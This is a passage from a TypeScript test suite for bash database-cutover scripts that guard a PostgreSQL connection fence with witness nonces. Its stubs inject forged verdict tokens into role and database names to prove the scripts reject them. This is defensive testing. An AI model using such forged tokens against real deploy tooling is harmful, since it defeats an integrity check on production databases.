    // AND AGAIN WITH NOTHING THERE, which is the ordinary path: the fence calls it once on the way
    // in and the release calls it again on the way out.
    'db_fence_witness_stop',
    'echo "AFTER A SECOND TEARDOWN" >&2',
    'echo "AND STDOUT TOO"',
  ].join('\n'))

  assert.match(result.output, /^BEFORE$/m, `precondition: stderr reached the caller before any teardown:\n${result.output}`)
  assert.match(result.output, /^AFTER ONE TEARDOWN$/m,
    `a witness teardown must not silence the shell that performed it:\n${result.output}`)
  assert.match(result.output, /^AFTER A SECOND TEARDOWN$/m,
    `nor may the second one, which every release performs:\n${result.output}`)
  assert.match(result.output, /^AND STDOUT TOO$/m, `and stdout must survive it as well:\n${result.output}`)
})

/**
 * TAKING DOWN A WITNESS WHOSE READER HAS GONE MUST NOT KILL THE SHELL (o3d-secops r31).
 *
 * The companion to the stderr test above, and the other half of the same defect. The teardown used
 * to send a `close` line down the co-process's pipe. On the ordinary "no witness here" path the
 * reader is already gone, bash does NOT ignore SIGPIPE, and the write therefore killed the WHOLE
 * ENTRYPOINT with a signal — mid-cutover, with a fence possibly standing. It is guarded here rather
 * than through db_fence_raise() because there it fires only when bash has not yet reaped the
 * co-process, and a guard that depends on that is a guard that is green about nothing.
 *
 * THE READER IS GONE WHILE THE FD IS STILL KNOWN, which is the state that makes it deterministic:
 * the co-process closes its own stdin and stays alive, so ${DB_FENCE_WITNESS[1]} is still a real
 * descriptor and the pipe behind it has no reader at all.
 *
 * MUTATION ROUTE (made against the shipped file and reverted): put
 * `printf 'close\n' >&"${DB_FENCE_WITNESS[1]}" 2>/dev/null || true` back at the top of
 * db_fence_witness_stop() and this run exits 141 with 'SURVIVED THE TEARDOWN' unprinted.
 */
test('[o3d-secops r31] taking down a witness whose reader has gone does not kill the shell', () => {
  const FENCE_LIB = readFileSync(join(process.cwd(), 'scripts/lib/db-fence-protected.sh'), 'utf8')
  const result = runShell([
    'set -uo pipefail',
    'exec 2>&1',
    shellFunction(FENCE_LIB, 'db_fence_witness_nonce'),
    shellFunction(FENCE_LIB, 'db_fence_witness_stop'),
    'DB_FENCE_WITNESS_BOUND=0',
    // ALIVE, WITH NO READER. `exec 0<&-` closes the co-process's own stdin; the sleep keeps the
    // process (and so bash's record of its descriptors) in place while the teardown runs.
    'coproc DB_FENCE_WITNESS { exec 0<&-; sleep 3; }',
    'sleep 0.4',
    'PRECONDITION="${DB_FENCE_WITNESS[1]:-none}"',
    'echo "WRITE FD IS ${PRECONDITION}"',
    'db_fence_witness_stop',
    'echo "SURVIVED THE TEARDOWN"',
  ].join('\n'))

  assert.doesNotMatch(result.output, /^WRITE FD IS none$/m,
    `precondition: the descriptor must still be known, or this exercises the easy case:\n${result.output}`)
  assert.match(result.output, /^SURVIVED THE TEARDOWN$/m,
    `taking down a witness whose reader has gone must not kill the cutover with a signal:\n${result.output}`)
  assert.equal(result.status, 0, `and the shell must exit cleanly, not on SIGPIPE:\n${result.output}`)
})

// ---------------------------------------------------------------------------
// o3d-secops r32, Codex HIGH 1 — PROSE AND MACHINE DATA NO LONGER SHARE A CHANNEL,
// AND THE CHANNEL IS NO LONGER READ BY SUBSTRING.
//
// THE FINDING. `released` held the WHOLE of `--release`'s stdout, and the shell accepted the
// verdict with `[[ "$released" == *"witness_colocated=yes"* ]]`. Eleven `console.log` calls in the
// helper wrote to that same stdout, and several of them interpolate a DATABASE OR ROLE NAME --
// `Connection fence released: CONNECT restored to <roles> on <database>.` above all. A database or
// a role called `x witness_colocated=yes` therefore set the verdict, and root then deleted the
// sole authority for a fence still standing on the real server. The fence side had the same defect
// with `fence_witness=colocated`, and both were duplicated across all three entrypoints.
//
// WHAT THESE MEASURE, and it is three separate properties rather than three spellings of one:
//
//   1. A NAME SOMEBODY ELSE CHOSE CANNOT FORGE A VERDICT. The stub puts the token on the channel
//      the way an identifier would -- inside a longer line, and on a line of its own carrying a
//      DIFFERENT nonce -- and the record must survive.
//   2. TWO ANSWERS ARE NOT AN ANSWER. A stream that says both must refuse rather than take the
//      last one, because `tail -1` semantics are how an appended line becomes the verdict.
//   3. A VERDICT WITH NO CHALLENGE REFUSES. This is the one that is easy to miss and the shape
//      this branch has closed four times: the ABSENCE of the exchange must not read as success.
//      The stub learns the nonce through the witness co-process and answers PERFECTLY -- right
//      grammar, right nonce, single line -- while the shell never issued the challenge, so only
//      the `${#witness_argv[@]}` guard can refuse it.
// ---------------------------------------------------------------------------

/**
 * A checkout whose `--release` speaks the r32 grammar and whatever else the case needs on stdout.
 *
 * `nonceSink` is the file the WITNESS stub writes every challenge nonce it is asked for. It is how
 * case 3 above is reachable at all: `--release` is a different process from the witness, so
 * without a channel between them a run that never passed `--witness-challenge=` could not produce
 * a correctly-formed verdict, and the guard being tested would have nothing to refuse.
 */
function witnessProtocolCheckout(
  dir: string,
  options: {
    verdict?: 'yes' | 'no'
    extraStdout?: string[]
    confirmChallenge?: boolean
    sightings?: number
    // ONE ANSWER, OR ONE PER CALL. The re-fence case needs the FIRST `--bind-migration` to bind --
    // the cutover's own gate refuses otherwise and the run never reaches its trap -- and the
    // SECOND, the trap's own, to fail. A single value repeats for every call.
    binding?: 'colocated' | 'absent' | ReadonlyArray<'colocated' | 'absent'>
    samplerStuck?: boolean
  } = {},
): void {
  const {
    verdict = 'yes', extraStdout = [], confirmChallenge = true,
    sightings = 1, binding = 'colocated', samplerStuck = false,
  } = options
  const helper = writeFenceCheckout(dir, '')
  const sink = JSON.stringify(join(dir, 'challenge-nonce'))
  // WHERE THE `--hold-stamp` PROBE ANNOUNCES ITSELF. In the shipped mechanism the witness sees that
  // probe through `pg_stat_activity`; there is no PostgreSQL here and the witness is a different
  // process, so the probe leaves a file and the witness stub counts it. What is under test in this
  // file is the SHELL: that it runs the probe, asks the sampler on both sides of it, and refuses
  // when the count did not move.
  const held = JSON.stringify(join(dir, 'hold-stamp-probe'))
  const bindings = Array.isArray(binding) ? binding : [binding as 'colocated' | 'absent']
  const bindSeq = JSON.stringify(join(dir, 'bind-call-count'))
  writeFileSync(helper, [
    "import { appendFileSync, existsSync, readFileSync, writeFileSync } from 'node:fs'",
    `appendFileSync(${JSON.stringify(join(dir, 'calls.log'))}, process.argv.slice(2).join(' ') + '\\n')`,
    "if (process.argv.includes('--plan')) {",
    "  process.stdout.write(JSON.stringify({",
    "    database: 'imsdb', owner_role: 'imsapp', app_role: 'imsapp', admin_role: 'deployadmin',",
    "    revoked: ['PUBLIC', 'imsapp'], datacl_before: null, fenced_at: '2026-01-01T00:00:00.000Z',",
    "  }) + '\\n')",
    '}',
    "if (process.argv.includes('--print-migration-url')) process.stdout.write(`postgres://admin@127.0.0.1/nowhere?application_name=ims-migration-${process.argv.find((a) => a.startsWith('--migration-nonce='))?.slice('--migration-nonce='.length) ?? ''}\\n`)",
    // THE WITNESS, WHICH ALSO RECORDS EVERY NONCE IT IS CHALLENGED WITH. Whether it CONFIRMS is
    // the parameter: a witness that hears the challenge and says nothing is exactly the state in
    // which the shell issues no `--witness-challenge=` and the verdict below is unasked-for.
    "if (process.argv.includes('--witness')) {",
    "  const nonce = process.argv.find((a) => a.startsWith('--witness-nonce='))?.slice('--witness-nonce='.length) ?? ''",
    "  process.stdout.write(`WITNESS_READY ${nonce}\\n`)",
    "  let buffer = ''",
    "  process.stdin.on('data', (chunk) => {",
    "    buffer += chunk.toString('utf8')",
    "    let index",
    "    while ((index = buffer.indexOf('\\n')) >= 0) {",
    "      const line = buffer.slice(0, index).trim()",
    "      buffer = buffer.slice(index + 1)",
    "      const hit = /^challenge ([0-9a-f]+)$/.exec(line)",
    `      if (hit) { writeFileSync(${sink}, hit[1]); ${confirmChallenge ? 'process.stdout.write(`WITNESS_HELD ${hit[1]}\\n`)' : '/* heard, never confirmed */'} }`,
    "      const w = /^watch ([0-9a-f]+)$/.exec(line)",
    "      if (w) process.stdout.write(`WITNESS_WATCHING ${w[1]}\\n`)",
    "      const g = /^sightings ([0-9a-f]+)$/.exec(line)",
    // THE COUNT GROWS WHEN, AND ONLY WHEN, A `--hold-stamp` PROBE HAS RUN. `samplerStuck` is how
    // a sampler that has DIED is exhibited: the probe runs and reports colocated, and the count
    // does not move -- which reads exactly like "the migration went elsewhere" and must refuse.
    `      const grown = ${samplerStuck ? '0' : `(existsSync(${held}) ? 1 : 0)`}`,
    `      if (g) process.stdout.write(\`WITNESS_SIGHTINGS \${g[1]} \${${sightings} + grown}\n\`)`,
    "    }",
    "  })",
    "  await new Promise((resolve) => process.stdin.on('end', resolve))",
    "  process.exit(0)",
    "}",
    "const lockArg = process.argv.find((a) => a.startsWith('--witness-lock='))?.slice('--witness-lock='.length) ?? ''",
    "const migrationArg = process.argv.find((a) => a.startsWith('--migration-nonce='))?.slice('--migration-nonce='.length) ?? ''",
    "if (process.argv.includes('--bind-migration')) {",
    `  if (process.argv.includes('--hold-stamp')) writeFileSync(${held}, 'held')`,
    `  const answers = ${JSON.stringify(bindings)}`,
    `  const seen = existsSync(${bindSeq}) ? Number(readFileSync(${bindSeq}, 'utf8')) : 0`,
    `  writeFileSync(${bindSeq}, String(seen + 1))`,
    '  const answer = answers[Math.min(seen, answers.length - 1)]',
    '  process.stdout.write(`MIGRATION_BINDING ${migrationArg} ${answer}\\n`)',
    "  process.exit(answer === 'colocated' ? 0 : 1)",
    "}",
    "if (process.argv.includes('--fence') && lockArg) process.stdout.write(`FENCE_WITNESS ${lockArg} colocated\\n`)",
    // THE NONCE THE WITNESS WAS CHALLENGED WITH, whether or not this run was told it on argv. That
    // is the whole point of the sink: the release can answer a question nobody asked it.
    `const heardNonce = existsSync(${sink}) ? readFileSync(${sink}, 'utf8').trim() : ''`,
    "const challengeArg = process.argv.find((a) => a.startsWith('--witness-challenge='))?.slice('--witness-challenge='.length) ?? ''",
    "const answerNonce = challengeArg || heardNonce",
    `if (process.argv.includes('--release') && answerNonce) process.stdout.write(\`RELEASE_WITNESS \${answerNonce} ${verdict === 'yes' ? 'colocated' : 'absent'}\\n\`)`,
    ...extraStdout,
    'process.exit(0)',
    '',
  ].join('\n'))
}

/** Fence, then release, then say whether the record survived. */
function fenceThenReleaseProgram(entry: typeof FENCE_HARNESS[number], dir: string): string {
  return [
    'set -uo pipefail',
    'exec 2>&1',
    entry.preamble(dir),
    'error() { echo "ERROR: $*" >&2; }',
    'DB_FENCE_RAISED=false',
    CUTOVER_DIR_PRIMITIVES,
    shellFunction(entry.source, 'fence_db_connections'),
    shellFunction(entry.source, 'release_db_connections'),
    'fence_db_connections',
    'release_db_connections || echo "RELEASE REPORTED FAILURE"',
    '[[ -e "${DB_FENCE_STATE}" ]] && echo AUTHORITY_REMAINS || echo AUTHORITY_CLEARED',
  ].join('\n')
}

for (const entry of FENCE_HARNESS) {
  // MUTATION ROUTE (made against the shipped file and reverted): replace the guard in this
  // entrypoint's release with r31's `if [[ "$released" == *"RELEASE_WITNESS"*"colocated"* ]]` --
  // this prints AUTHORITY_CLEARED, which is root deleting the fence record on the strength of a
  // database name. Restoring `db_fence_machine_verdict` makes it red again.
  test(`${entry.name}: a role or database name carrying the attestation token does not forge the release verdict (o3d-secops r32, Codex HIGH 1)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r32forge-'))
    try {
      witnessProtocolCheckout(dir, {
        verdict: 'no',
        extraStdout: [
          // WHAT THE HELPER ITSELF USED TO PRINT, with the token inside a name somebody chose.
          // r31 read the stream by substring, so this line alone authorised the deletion.
          "if (process.argv.includes('--release')) process.stdout.write('Connection fence released: CONNECT restored to PUBLIC, imsapp on RELEASE_WITNESS 00000000000000000000000000000000 colocated.\\n')",
          // AND THE SAME TOKEN AS A WHOLE LINE, for a nonce this run never minted -- which is the
          // most an attacker who cannot see root's randomness can produce.
          "if (process.argv.includes('--release')) process.stdout.write('RELEASE_WITNESS ffffffffffffffffffffffffffffffff colocated\\n')",
        ],
      })
      const result = runShell(fenceThenReleaseProgram(entry, dir))

      // THE PRECONDITIONS. Without these the test passes on a run that never got as far as asking.
      assert.match(calls(dir), /^--release .*--witness-challenge=[0-9a-f]{32}/m,
        `precondition: the release must have been given a real challenge:\n${result.output}`)
      assert.match(result.output, /RELEASE_WITNESS 00000000000000000000000000000000 colocated/,
        `precondition: the forged text must actually have reached the channel root reads:\n${result.output}`)

      assert.match(result.output, /^AUTHORITY_REMAINS$/m,
        `a name somebody else chose must not license the removal of the fence record:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  // MUTATION ROUTE (made against the shipped file and reverted): change db_fence_machine_verdict()
  // to `[[ "${yes}" -ge 1 ]]` -- ignoring the conflicting line -- and this prints AUTHORITY_CLEARED.
  test(`${entry.name}: a stream that answers the same challenge twice, once each way, refuses (o3d-secops r32, Codex HIGH 1)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r32conflict-'))
    try {
      witnessProtocolCheckout(dir, {
        verdict: 'yes',
        extraStdout: [
          // THE SAME NONCE, THE OTHER ANSWER. Whichever is "last" is an accident of ordering, and a
          // reader that resolves it by position is a reader an appended line can steer.
          "if (process.argv.includes('--release') && answerNonce) process.stdout.write(`RELEASE_WITNESS ${answerNonce} absent\\n`)",
        ],
      })
      const result = runShell(fenceThenReleaseProgram(entry, dir))

      assert.match(result.output, /RELEASE_WITNESS [0-9a-f]{32} colocated/,
        `precondition: the affirmative line must be present, or this tests nothing:\n${result.output}`)
      assert.match(result.output, /RELEASE_WITNESS [0-9a-f]{32} absent/,
        `precondition: and so must the contradicting one:\n${result.output}`)
      assert.match(result.output, /^AUTHORITY_REMAINS$/m,
        `a stream that answers both ways has not answered, and the record must survive it:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  // MUTATION ROUTE (made against the shipped file and reverted): delete
  // `[[ "${#witness_argv[@]}" -gt 0 ]] &&` from this entrypoint's release guard and this prints
  // AUTHORITY_CLEARED -- root removing the record on a verdict for a challenge it never issued.
  test(`${entry.name}: a perfectly formed verdict for a challenge that was never issued refuses (o3d-secops r32, Codex HIGH 1)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r32unasked-'))
    try {
      // The witness HEARS the challenge and records the nonce, and never confirms it. The shell
      // therefore passes no `--witness-challenge=`, while the release can still answer with the
      // exact nonce, in the exact grammar, on a line of its own.
      witnessProtocolCheckout(dir, { verdict: 'yes', confirmChallenge: false })
      const result = runShell(fenceThenReleaseProgram(entry, dir))

      assert.doesNotMatch(calls(dir), /--witness-challenge=/,
        `precondition: no challenge may have been issued, or this measures the ordinary path:\n${calls(dir)}`)
      assert.match(result.output, /RELEASE_WITNESS [0-9a-f]{32} colocated/,
        `precondition: the unasked-for verdict must be well-formed and carry a real nonce, or the`
        + ` nonce check alone would refuse it and this guard would go unmeasured:\n${result.output}`)
      assert.match(result.output, /^AUTHORITY_REMAINS$/m,
        `the absence of the exchange must not read as success:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  // MUTATION ROUTE (made against the shipped file and reverted): in db_fence_raise(), drop the
  // `[[ "${#witness_argv[@]}" -gt 0 ]] &&` and the db_fence_machine_verdict call and restore
  // `[[ "${fenced}" == *"fence_witness=colocated"* ]]` with the stub printing the old token inside
  // a role name -- the record is then cleared, which is the fence-side half of the same finding.
  test(`${entry.name}: a name carrying the fence-side token does not raise the witness-bound flag (o3d-secops r32, Codex HIGH 1)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r32fenceforge-'))
    try {
      witnessProtocolCheckout(dir, {
        verdict: 'yes',
        extraStdout: [
          // The fence's own report, for a nonce this run never minted, plus the same token buried
          // in the kind of line the helper used to print on stdout.
          "if (process.argv.includes('--fence')) process.stdout.write('FENCE_WITNESS ffffffffffffffffffffffffffffffff colocated\\n')",
          "if (process.argv.includes('--fence')) process.stdout.write('Database imsdb is fenced: CONNECT revoked from FENCE_WITNESS 0000 colocated, PUBLIC.\\n')",
        ],
      })
      // The witness is bound from the REAL verdict here, so the flag is 1 and this alone proves
      // nothing; what it proves is that the forged lines did not raise it on their own. The
      // negative is exercised by the same stub with the real fence verdict suppressed.
      const program = [
        'set -uo pipefail',
        'exec 2>&1',
        entry.preamble(dir),
        'error() { echo "ERROR: $*" >&2; }',
        'DB_FENCE_RAISED=false',
        CUTOVER_DIR_PRIMITIVES,
        shellFunction(entry.source, 'fence_db_connections'),
        'fence_db_connections',
        'echo "BOUND=${DB_FENCE_WITNESS_BOUND}"',
      ].join('\n')
      const result = runShell(program)
      assert.match(result.output, /^BOUND=1$/m,
        `precondition: with a real witness the flag is raised, so the negative below is about the forgery:\n${result.output}`)

      // NOW THE SAME RUN WITH NO WITNESS AT ALL: the forged lines are all that is on the channel.
      const bare = mkdtempSync(join(tmpdir(), 'ims-r32fenceforge-bare-'))
      try {
        const helper = writeFenceCheckout(bare, '')
        writeFileSync(helper, [
          "import { appendFileSync } from 'node:fs'",
          `appendFileSync(${JSON.stringify(join(bare, 'calls.log'))}, process.argv.slice(2).join(' ') + '\\n')`,
          "if (process.argv.includes('--witness')) process.exit(1)",
          "if (process.argv.includes('--plan')) {",
          "  process.stdout.write(JSON.stringify({",
          "    database: 'imsdb', owner_role: 'imsapp', app_role: 'imsapp', admin_role: 'deployadmin',",
          "    revoked: ['PUBLIC', 'imsapp'], datacl_before: null, fenced_at: '2026-01-01T00:00:00.000Z',",
          "  }) + '\\n')",
          '}',
          "if (process.argv.includes('--print-migration-url')) process.stdout.write('postgres://admin@127.0.0.1/nowhere\\n')",
          "if (process.argv.includes('--fence')) process.stdout.write('FENCE_WITNESS ffffffffffffffffffffffffffffffff colocated\\n')",
          "if (process.argv.includes('--fence')) process.stdout.write('Database imsdb is fenced: CONNECT revoked from FENCE_WITNESS 0000 colocated, PUBLIC.\\n')",
          'process.exit(0)',
          '',
        ].join('\n'))
        const bareResult = runShell([
          'set -uo pipefail',
          'exec 2>&1',
          entry.preamble(bare),
          'error() { echo "ERROR: $*" >&2; }',
          'DB_FENCE_RAISED=false',
          CUTOVER_DIR_PRIMITIVES,
          shellFunction(entry.source, 'fence_db_connections'),
          'fence_db_connections',
          'echo "BOUND=${DB_FENCE_WITNESS_BOUND}"',
        ].join('\n'))
        assert.match(bareResult.output, /FENCE_WITNESS ffffffffffffffffffffffffffffffff colocated/,
          `precondition: the forged lines must reach the channel:\n${bareResult.output}`)
        assert.match(bareResult.output, /^BOUND=0$/m,
          `a fence with no witness must not be told it has one by text on its own stdout:\n${bareResult.output}`)
      } finally {
        rmSync(bare, { recursive: true, force: true })
      }
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })
}

// ---------------------------------------------------------------------------
// o3d-secops r32, Codex HIGH 2 (o3d-mzcp) — THE MIGRATION IS BOUND TO THE SERVER THAT WAS FENCED.
//
// THE FINDING. The fence helper exits; `prisma migrate deploy`, the drift check, `pg_dump`, the
// object-access check and the verification hook then open INDEPENDENT connections from
// ${MIGRATION_DATABASE_URL}, and nothing showed that any of them reached the instance the fence
// was raised on. These measure the SHELL BETWEEN the composed URL and the two gates: that an
// ordinary cutover still migrates with nobody at a terminal, that a probe reporting `absent`
// refuses BEFORE any DDL, and that a witness which never saw a migration backend refuses AFTER it.
//
// The colocation itself -- what an advisory lock and `pg_stat_activity` actually say about two
// clusters -- is measured against REAL PostgreSQL servers in
// tests/scripts/db-connection-fence.test.ts, because a stub answering that question would be a
// test of this file's model of PostgreSQL.
// ---------------------------------------------------------------------------

for (const entry of FENCE_HARNESS) {
  // MUTATION ROUTE (made against the shipped file and reverted): delete the
  // `bind_migration_to_fenced_server` call from this entrypoint's fence path -- the assertion that
  // `--bind-migration` was invoked with the URL's own nonce fails.
  test(`${entry.name}: an ordinary cutover binds the migration and needs nobody at a terminal (o3d-secops r32, Codex HIGH 2)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r32bind-ok-'))
    try {
      witnessProtocolCheckout(dir, { verdict: 'yes', binding: 'colocated', sightings: 2 })
      const result = runShell(fenceThenReleaseProgram(entry, dir))

      const stamped = /--print-migration-url --migration-nonce=([0-9a-f]{32})/.exec(calls(dir))?.[1]
      assert.ok(stamped, `the migration URL must be composed with a stamp:\n${calls(dir)}`)
      assert.match(calls(dir), new RegExp(`^--bind-migration --migration-nonce=${stamped} --witness-lock=[0-9a-f]{32}`, 'm'),
        `and the probe must ask about THAT nonce, read back out of the URL rather than remembered:\n${calls(dir)}`)
      // AND THE LOCK IT LOOKS FOR IS FRESH. A reused one would be a fact some earlier copy of the
      // cluster could already contain, which is the whole property a nonce buys.
      const fenceLock = /^--fence .*--witness-lock=([0-9a-f]{32})/m.exec(calls(dir))?.[1]
      const bindLock = /^--bind-migration .*--witness-lock=([0-9a-f]{32})/m.exec(calls(dir))?.[1]
      assert.ok(fenceLock && bindLock, `both locks must reach the helper:\n${calls(dir)}`)
      assert.notEqual(fenceLock, bindLock, 'the migration window takes a lock of its own, minted at the window')

      assert.doesNotMatch(result.output, /^DIE:/m, `and the ordinary cutover must not refuse:\n${result.output}`)
      assert.match(result.output, /^AUTHORITY_CLEARED$/m,
        `and must still end its own record with nobody at a terminal:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  // MUTATION ROUTE (made against the shipped file and reverted): change the `*)` arm of
  // bind_migration_to_fenced_server() from `die` to `warn` -- REACHED THE MIGRATION is then printed
  // and the schema would move on a server this run cannot place.
  test(`${entry.name}: a migration connection that lands on another instance refuses before any DDL (o3d-secops r32, Codex HIGH 2)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r32bind-absent-'))
    try {
      witnessProtocolCheckout(dir, { verdict: 'yes', binding: 'absent' })
      const result = runShell([
        'set -uo pipefail',
        'exec 2>&1',
        entry.preamble(dir),
        'error() { echo "ERROR: $*" >&2; }',
        'DB_FENCE_RAISED=false',
        CUTOVER_DIR_PRIMITIVES,
        shellFunction(entry.source, 'fence_db_connections'),
        'fence_db_connections',
        'echo "REACHED THE MIGRATION"',
      ].join('\n'))

      assert.match(calls(dir), /^--bind-migration /m,
        `precondition: the probe must have run:\n${calls(dir)}`)
      assert.doesNotMatch(result.output, /^REACHED THE MIGRATION$/m,
        `a migration that would land somewhere else must not be reached:\n${result.output}`)
      assert.match(result.output, /WOULD NOT HAVE LANDED ON THE SERVER THIS RUN FENCED/,
        `and the operator must be told which question was answered:\n${result.output}`)
      assert.match(result.output, /NOTHING HAS BEEN MIGRATED/,
        `and that the schema is untouched:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  const closeTheWindow = (dir: string) => [
    'set -uo pipefail',
    'exec 2>&1',
    entry.preamble(dir),
    'error() { echo "ERROR: $*" >&2; }',
    'DB_FENCE_RAISED=false',
    CUTOVER_DIR_PRIMITIVES,
    shellFunction(entry.source, 'fence_db_connections'),
    'fence_db_connections',
    // ${DB_FENCE_UP} is what fence_db_connections() sets on a fence that went up, and the gate
    // returns immediately without it -- so a rig that stubbed the fence out would measure the
    // early return rather than the gate.
    'echo "FENCE UP=${DB_FENCE_UP}"',
    'require_migration_landed_on_fenced_server',
    // BOTH FLAGS, because r33 separated them and the difference is the finding: "keep the record"
    // and "there is no witness" used to be the same bit, so a sampling miss took the release's own
    // challenge away with it and the run died two steps later.
    'echo "BOUND AT THE END=${DB_FENCE_WITNESS_BOUND}"',
    'echo "KEEP RECORD=${DB_FENCE_KEEP_RECORD}"',
    'echo "STARTED THE NEW BUILD"',
  ].join('\n')

  // THE CLOSING GATE IS DETERMINISTIC, AND THIS IS WHY (o3d-secops r32).
  //
  // The first draft of this round made the refusal "did the sampler see prisma?". MEASURED against
  // a real cluster: a warm `prisma migrate status` connects, reads and disconnects inside about
  // 40ms, and a 50ms sampler missed it in EVERY run. Polling cannot promise to observe a connection
  // somebody else opens and closes, so that gate would have refused ordinary cutovers -- trading
  // this finding for an outage. What it asks now is a question about a connection THIS RUN HOLDS
  // OPEN: `--bind-migration --hold-stamp` must both see the witness and BE SEEN by the sampler.
  //
  // MUTATION ROUTE (made against the shipped file and reverted): change the `*)` arm of
  // require_migration_landed_on_fenced_server() from `die` to `warn` -- STARTED THE NEW BUILD is
  // then printed after a window whose closing position nothing could establish.
  test(`${entry.name}: a closing probe the sampler cannot see refuses (o3d-secops r32, Codex HIGH 2)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r32stuck-'))
    try {
      // The probe runs and reports colocated; the sampler's count does not move. That is a sampler
      // which has died, and it reads EXACTLY like "the migration went elsewhere" -- which is why it
      // may not be allowed to produce the reassuring one of the two readings.
      witnessProtocolCheckout(dir, { verdict: 'yes', binding: 'colocated', sightings: 3, samplerStuck: true })
      const result = runShell(closeTheWindow(dir))

      assert.match(result.output, /^FENCE UP=true$/m,
        `precondition: the gate returns at once without a fence, so one must be standing:\n${result.output}`)
      assert.match(calls(dir), /^--bind-migration --hold-stamp /m,
        `precondition: the closing probe must have run, holding its stamp:\n${calls(dir)}`)
      assert.doesNotMatch(result.output, /^STARTED THE NEW BUILD$/m,
        `nothing may start on a schema this run cannot place:\n${result.output}`)
      assert.match(result.output, /THE SCHEMA MAY HAVE MOVED/,
        `and the operator must be told that this refusal comes AFTER the DDL:\n${result.output}`)
      assert.match(result.output, /STILL UP/,
        `and that the fence is being held rather than released:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  // MUTATION ROUTE (made against the shipped file and reverted): delete `DB_FENCE_KEEP_RECORD=1`
  // from the `4)` arm -- the flag stays false, the release goes on to remove the record
  // automatically, and a window in which the migration's own backends were never observed ends with
  // no trace for anybody to look at.
  //
  // AND WHAT IT WITHHOLDS CHANGED IN r33 (Codex MEDIUM). This arm used to lower
  // ${DB_FENCE_WITNESS_BOUND}, which is the flag that means THERE IS NO WITNESS -- so the release
  // issued no challenge, could not set `clear_server` and returned FAILURE, and this purportedly
  // non-refusing status ended the run with the schema migrated and nothing started. The assertion
  // below therefore holds BOTH directions: the record is withheld, AND the witness survives to
  // answer the release. The outcome at the END of the run is measured separately, in the r33 test
  // named "a sampling miss keeps the record and still finishes the run" -- which is the gap this
  // test had: it asserted the behaviour at the gate and the claim is about the outcome.
  test(`${entry.name}: a window whose own backends were never seen keeps the record instead of refusing (o3d-secops r32, Codex HIGH 2)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r32unseen-'))
    try {
      // The closing probe binds and IS seen -- the count moves from 0 to 1 -- so the string is
      // where it should be and the sampler works. What was never seen is a backend carrying the
      // stamp while the migration itself ran. Real evidence, and it costs the record's automatic
      // removal; it does not cost the deploy, because a miss is a property of polling.
      witnessProtocolCheckout(dir, { verdict: 'yes', binding: 'colocated', sightings: 0 })
      const result = runShell(closeTheWindow(dir))

      assert.match(result.output, /^FENCE UP=true$/m,
        `precondition: the gate returns at once without a fence, so one must be standing:\n${result.output}`)
      assert.match(calls(dir), /^--bind-migration --hold-stamp /m,
        `precondition: the closing probe must have run:\n${calls(dir)}`)
      assert.match(result.output, /^STARTED THE NEW BUILD$/m,
        `a missed sample is a property of polling, not of the deploy, so the cutover must go on:\n${result.output}`)
      assert.match(result.output, /^KEEP RECORD=1$/m,
        `but the record must be withheld, which is what keeps it for a person:\n${result.output}`)
      assert.match(result.output, /^BOUND AT THE END=1$/m,
        `and the witness must SURVIVE, or the release issues no challenge and this "non-refusing" status refuses two steps later:\n${result.output}`)
      assert.match(result.output, /KEPT/,
        `and the operator must be told that is what happened:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

  // AND A RUN WITH NO WITNESS IS NOT REFUSED. This is the degraded mode every host behind a
  // transaction-mode pooler or with a single-database cluster is in, and turning it into an outage
  // would be trading this finding for a worse one.
  // MUTATION ROUTE (made against the shipped file and reverted): make db_fence_migration_bind()
  // return 1 instead of 3 when ${DB_FENCE_WITNESS_BOUND} is 0 -- this run then dies and every such
  // host stops being able to deploy.
  test(`${entry.name}: a cutover that could hold no witness still migrates, and says the record will be kept (o3d-secops r32)`, () => {
    const dir = mkdtempSync(join(tmpdir(), 'ims-r32nowitness-'))
    try {
      const helper = writeFenceCheckout(dir, '')
      writeFileSync(helper, [
        "import { appendFileSync } from 'node:fs'",
        `appendFileSync(${JSON.stringify(join(dir, 'calls.log'))}, process.argv.slice(2).join(' ') + '\\n')`,
        "if (process.argv.includes('--witness')) process.exit(1)",
        "if (process.argv.includes('--plan')) {",
        "  process.stdout.write(JSON.stringify({",
        "    database: 'imsdb', owner_role: 'imsapp', app_role: 'imsapp', admin_role: 'deployadmin',",
        "    revoked: ['PUBLIC', 'imsapp'], datacl_before: null, fenced_at: '2026-01-01T00:00:00.000Z',",
        "  }) + '\\n')",
        '}',
        "if (process.argv.includes('--print-migration-url')) process.stdout.write(`postgres://admin@127.0.0.1/nowhere?application_name=ims-migration-${process.argv.find((a) => a.startsWith('--migration-nonce='))?.slice('--migration-nonce='.length) ?? ''}\\n`)",
        'process.exit(0)',
        '',
      ].join('\n'))
      const result = runShell([
        'set -uo pipefail',
        'exec 2>&1',
        entry.preamble(dir),
        'error() { echo "ERROR: $*" >&2; }',
        'DB_FENCE_RAISED=false',
        CUTOVER_DIR_PRIMITIVES,
        shellFunction(entry.source, 'fence_db_connections'),
        'fence_db_connections',
        'require_migration_landed_on_fenced_server',
        'echo "REACHED THE MIGRATION"',
      ].join('\n'))

      assert.doesNotMatch(calls(dir), /^--bind-migration /m,
        `precondition: with no witness there is nothing to bind against, so no probe is run:\n${calls(dir)}`)
      assert.match(result.output, /^REACHED THE MIGRATION$/m,
        `a host that can hold no witness must still be able to deploy:\n${result.output}`)
      assert.match(result.output, /KEPT/,
        `and must be told the fence record will be kept for a person:\n${result.output}`)
    } finally {
      rmSync(dir, { recursive: true, force: true })
    }
  })

